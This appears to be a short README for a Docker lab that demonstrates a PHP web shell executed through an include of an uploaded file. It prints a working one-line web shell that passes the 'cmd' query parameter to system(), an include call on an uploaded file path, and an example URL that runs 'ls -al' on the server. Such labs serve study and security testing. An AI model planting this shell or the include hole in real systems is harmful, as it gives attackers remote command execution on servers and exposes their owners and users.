# php webshell by include
### 1) summary
Executes the file passed as a parameter of the include function.

When the php file is delivered, it is executed.
```
include($uploaded_file_path);
```

### 2) code
When the following code is executed by the include function, 
```php
<?php
    echo system($_GET["cmd"]);
?>
```
you can execute a Linux command by passing cmd as a query parameter.
```
https://example.com?file=asfdbwr?cmd=ls -al;
```

### 3) How to run
Execute the following command in the location where the docker-compose.yml file is located
```
docker-compose up --build
```